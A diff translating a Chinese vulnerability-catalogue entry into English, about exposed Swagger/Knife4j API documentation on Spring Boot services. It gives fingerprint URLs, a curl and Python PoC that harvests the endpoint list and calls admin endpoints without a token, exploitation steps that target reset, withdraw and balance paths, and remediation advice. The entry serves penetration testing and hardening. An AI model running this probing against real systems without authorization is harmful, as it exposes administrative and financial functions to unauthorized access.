@@ -1,39 +1,39 @@
 ﻿---
-title: Swagger / Knife4j 接口文档暴露 → 未授权接口直打
-cve: 无（配置缺陷）
+title: Exposed Swagger / Knife4j API documentation → direct calls to unauthenticated endpoints
+cve: None (configuration flaw)
 severity: high
 cvss: 8.3
-product: Spring Boot 系（swagger2/3、knife4j、springdoc）
-versions: 任意
+product: Spring Boot ecosystem (swagger2/3, knife4j, springdoc)
+versions: Any
 ports: 80, 443, 8080
-keywords: swagger, knife4j, springdoc, 文档, 未授权, api
+keywords: swagger, knife4j, springdoc, documentation, unauthenticated access, api
 entry: /v2/api-docs  /doc.html  /swagger-ui/index.html
 verified: false
-sources: 公开资料整理（配置缺陷类）
+sources: Compiled from public sources (configuration flaws)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 GET /v2/api-docs            → 200 JSON
 GET /v3/api-docs            → 200 JSON
-GET /doc.html               → knife4j 页面
-GET /swagger-ui/index.html  → swagger 页面
+GET /doc.html               → knife4j page
+GET /swagger-ui/index.html  → swagger page
 ```
 
-## 前置条件
+## Prerequisites
 
-- 生产环境未关闭文档端点。
+- Documentation endpoints are not disabled in production.
 
 ## PoC
 
 ```bash
-# 1) 拉全量接口清单
+# 1) Retrieve the full endpoint inventory
 for p in /v2/api-docs /v3/api-docs /v2/api-docs?group=default /doc.html; do
   echo "== $p"; curl -s -o /tmp/d.json -w '%{http_code} %{size_download}\n' "https://target$p"
 done
 
-# 2) 解析出 path 与参数
+# 2) Extract paths and parameters
 python3 - <<'PY'
 import json
 d=json.load(open('/tmp/d.json'))
@@ -41,24 +41,24 @@ for p,ops in d.get('paths',{}).items():
     for m in ops: print(m.upper(), p)
 PY
 
-# 3) 挑“管理类”接口直接打（无 token）
+# 3) Select "administrative" endpoints and call them directly (without a token)
 curl -s 'https://target/api/admin/user/list?page=1' | head -c 200
-# 判定：200 且有数据 = 未授权
+# Confirmation: 200 with data = unauthenticated access
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 先拉文档（只读）；
-2. 从 path 里筛 `admin|manage|export|reset|withdraw|balance`；
-3. 无 token 打一遍，再带普通会员 token 打一遍；
-4. 命中即批量接口未授权——写报告时点明可调用的写接口数；
-5. 证据：文档 200 + 一条未授权接口回包。
+1. First retrieve documentation (read-only);
+2. Filter paths for `admin|manage|export|reset|withdraw|balance`;
+3. Make one pass without a token, then another with an ordinary member token;
+4. Success means unauthenticated access across multiple endpoints—state the number of callable write endpoints in the report;
+5. Evidence: documentation 200 response + one unauthenticated endpoint response.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 生产关闭 swagger/knife4j（`springfox.documentation.enabled=false`）；文档只在内网；
-- 网关统一鉴权，不依赖前端隐藏。
+- Disable swagger/knife4j in production (`springfox.documentation.enabled=false`); restrict documentation to the internal network;
+- Enforce consistent gateway authorization rather than relying on frontend hiding.
 
-## 参考
+## References
 
-- OWASP API8 安全配置错误。
+- OWASP API8 Security Misconfiguration.
